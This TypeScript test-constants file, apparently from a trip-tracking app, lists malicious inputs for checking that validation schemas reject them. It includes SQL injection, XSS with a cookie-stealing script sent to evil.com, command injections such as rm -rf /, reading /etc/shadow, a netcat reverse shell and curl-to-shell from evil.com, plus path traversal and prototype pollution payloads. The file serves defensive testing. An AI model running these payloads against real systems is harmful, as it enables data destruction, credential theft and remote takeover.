/**
 * Security test constants and malicious input patterns
 * Used to test that our schemas and functions properly reject invalid/malicious input
 */

/**
 * SQL injection attempts
 */
export const SQL_INJECTION_STRINGS = [
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "admin'--",
  "' OR 1=1--",
  "'; DELETE FROM trips WHERE '1'='1",
  'UNION SELECT * FROM users--',
  "1; UPDATE users SET role='admin' WHERE 1=1;--",
  "Robert'); DROP TABLE trips;--",
];

/**
 * XSS (Cross-Site Scripting) attempts
 */
export const XSS_STRINGS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
];

/**
 * Command injection attempts
 */
export const COMMAND_INJECTION_STRINGS = [
  '; rm -rf /',
  '| cat /etc/passwd',
  '`rm -rf /`',
  '$(rm -rf /)',
  '; shutdown -h now',
  '&& cat /etc/shadow',
  '| nc -e /bin/sh attacker.com 4444',
  '; curl http://evil.com/malware.sh | sh',
];

/**
 * Path traversal attempts
 */
export const PATH_TRAVERSAL_STRINGS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  '/var/www/../../etc/passwd',
  'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
];

/**
 * Prototype pollution attempts
 */
export const PROTOTYPE_POLLUTION_OBJECTS = [
  { __proto__: { isAdmin: true } },
  { constructor: { prototype: { isAdmin: true } } },
  { __proto__: { __proto__: { isAdmin: true } } },
  JSON.parse('{"__proto__": {"isAdmin": true}}'),
  { prototype: { isAdmin: true } },
  { '__proto__.isAdmin': true },
  { 'constructor.prototype.isAdmin': true },
];

/**
 * Invalid date formats and edge cases
 */
export const INVALID_DATE_STRINGS = [
  'not-a-date',
  '2024/01/01', // Wrong format (should be YYYY-MM-DD)
  '01-01-2024', // Wrong format
  '2024-13-01', // Invalid month
  '2024-01-32', // Invalid day
  '2024-02-30', // Invalid day for February
  '0000-00-00', // All zeros
  '9999-99-99', // All nines
  '', // Empty string
  ' ', // Whitespace only
  'null', // String "null"
  'undefined', // String "undefined"
  '2024-01-01T00:00:00Z', // ISO format with time (should be date only)
  '2024.01.01', // Dots instead of dashes
  'SELECT * FROM users', // SQL injection in date
  '<script>alert(1)</script>', // XSS in date
];

/**
 * Invalid UUID formats
 */
export const INVALID_UUID_STRINGS = [
  'not-a-uuid',
  '12345678-1234-1234-1234-123456789012', // Valid format but not v4
  '12345678-1234-5234-1234-123456789012', // Wrong version
  'g2345678-1234-4234-1234-123456789012', // Invalid character
  '12345678-1234-4234-1234-12345678901', // Too short
  '12345678-1234-4234-1234-1234567890123', // Too long
  '123456781234423412341234567890123', // No dashes
  '', // Empty
  'null', // String "null"
  'undefined', // String "undefined"
];

/**
 * Extremely large numbers that might cause overflow
 */
export const LARGE_NUMBERS = [
  Number.MAX_SAFE_INTEGER,
  Number.MAX_SAFE_INTEGER + 1,
  Number.MAX_VALUE,
  Infinity,
  9007199254740992, // MAX_SAFE_INTEGER + 1
  1e308,
  -Number.MAX_SAFE_INTEGER,
  -Number.MAX_VALUE,
  -Infinity,
];

/**
 * Special number values
 */
export const SPECIAL_NUMBERS = [
  NaN,
  -0,
  0.1 + 0.2, // Floating point precision issue
  null as unknown as number,
  undefined as unknown as number,
  {} as unknown as number,
  [] as unknown as number,
  '123' as unknown as number, // String that looks like number
];

/**
 * Malicious trip objects with excess properties
 */
export const MALICIOUS_TRIP_OBJECTS: unknown[] = [
  {
    id: '123e4567-e89b-12d3-a456-426614174000',
    userId: '123e4567-e89b-12d3-a456-426614174001',
    departureDate: '2024-01-01',
    returnDate: '2024-01-10',
    location: 'Mexico',
    isSimulated: false,
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: '2024-01-01T00:00:00Z',
    // Excess properties that should be rejected by strict mode
    isAdmin: true,
    role: 'admin',
    __proto__: { isAdmin: true },
    deleteAllData: true,
    sqlInjection: "'; DROP TABLE users; --",
  },
  {
    // Valid properties
    departureDate: '2024-01-01',
    returnDate: '2024-01-10',
    // Trying to inject functions
    toString: () => 'malicious',
    valueOf: () => 999999,
    constructor: { name: 'Malicious' },
  },
];

/**
 * Test cases for boundary values
 */
export const BOUNDARY_TEST_CASES = {
  dates: {
    farPast: '1900-01-01',
    farFuture: '2999-12-31',
    epoch: '1970-01-01',
    y2k: '2000-01-01',
    leapDay: '2024-02-29',
    nonLeapDay: '2023-02-29', // Invalid
  },
  numbers: {
    zero: 0,
    negative: -1,
    veryLarge: 999999,
    decimal: 1.5,
  },
  strings: {
    empty: '',
    whitespace: '   ',
    veryLong: 'a'.repeat(10000),
    unicode: '😊🔥💯',
    rtl: 'مرحبا بالعالم', // Arabic RTL text
    zalgo: 'ẕ̸̧̢̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼͇͈͉͍͎̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛ͣͤͥͦͧͨͩͪͫͬͭͮͯ͘͜͟͢͝͞͠͡',
  },
};
